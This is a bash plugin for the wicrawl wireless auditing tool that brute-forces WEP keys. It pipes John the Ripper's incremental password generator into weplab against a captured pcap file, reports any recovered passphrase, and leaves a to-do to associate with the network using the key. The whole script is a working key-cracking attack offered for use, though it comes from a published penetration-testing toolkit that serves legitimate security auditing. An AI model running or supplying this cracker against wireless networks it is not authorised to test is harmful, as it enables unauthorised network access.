#!/bin/bash
#
# This is a plugin that will bruteforce wep keys based on a dictionary attack.
# It uses weplab, and requires that john the ripper is already installed.
#
# http://midnightresearch.com/projects/wicrawl
#
# Plugin Written by: Aaron Peterson
# Weplab Written by: Jose Ignacio Sanchez
#
# Thanks to Jose for doing all the hard work, :)
# http://weplab.sourceforge.net/

while getopts "b:e:i:n:r:s:v:" options; do
  case $options in
    b ) bssid=$OPTARG;;
    e ) encryption=$OPTARG;;
    i ) interface=$OPTARG;;
    n ) nick=$OPTARG;;
    r ) run=$OPTARG;;
    s ) ssid=$OPTARG;;
    v ) version=$OPTARG;;
    * ) echo "Not sure what $OPTARG is, ignoring for now";;
  esac
done

if [ "$bssid" == "" ] ; then
	echo " [!] Need to add -b <bssid>"
	exit 1
fi

john=$(which john 2>/dev/null)
if [ "$john" == "" ] ; then
    echo " [!!] Can't find john (from john the ripper) in the path"
		echo "      please install it and try again.."
    exit 1
fi
john="$john -incremental -stdout"

echo "  [*] Weplab Dictionary Brute force plugin";

weplab="/usr/bin/weplab"

if [ ! -x "$weplab" ] ; then
	echo "  [!] Weplab binary [$weplab] wasn't found, did you compile wicrawl?"
	exit 1
fi

weplab="$weplab --attacks 1 --bssid $bssid"
#pcapfile="./tcpdump-works-wi-fo-key-s:mrl.pcap"
pcapfile=$WICRAWL_PCAPFILE

# We get the pcap file from the environment (plugin-engine), need to
# make sure it's set and exists
pcapfile=$WICRAWL_PCAPFILE
if [ -z "$pcapfile" ] ; then
	echo "  [!] It doesn't appear that the pcapfile is set"
	echo "      Are you running this from the plugin-engine? or have"
	echo "      an old version? (we're expecting WICRAWL_PCAPFILE set in the env)"
	exit 1
fi

if [ ! -f "$pcapfile" ] ; then
	echo "  [!] pcap file [$pcapfile] does not appear to exist"
	exit 1
fi

# Check to see if it's in prism dump format...
# TODO See how it reacts to other header types...
output=$( file $pcapfile | grep -i prism )
if [ "$output" != "" ] ; then
	weplab="$weplab --prismheader "
fi

weplab="$weplab -y $pcapfile"
echo "  [*] Running [$john | $weplab]"

output=$( $john | $weplab | grep "Passphrase was" | sed 's/^.*--> //' )

if [ "$output" != "" ] ; then
	echo " [**] Success!  The passphrase was: [$output]"
	exit 8
else 
	echo "  [!] Failed.  Could not find WEP key"
	echo "      (were there were enough packets to check?)"
	exit 1
fi

# TODOTODO
# Need to actually try to associate with this key now that we found it.
# also need to dump more packets manually if there aren't enough already..

exit 1;
# vim:ts=2:sw=2:sts=0
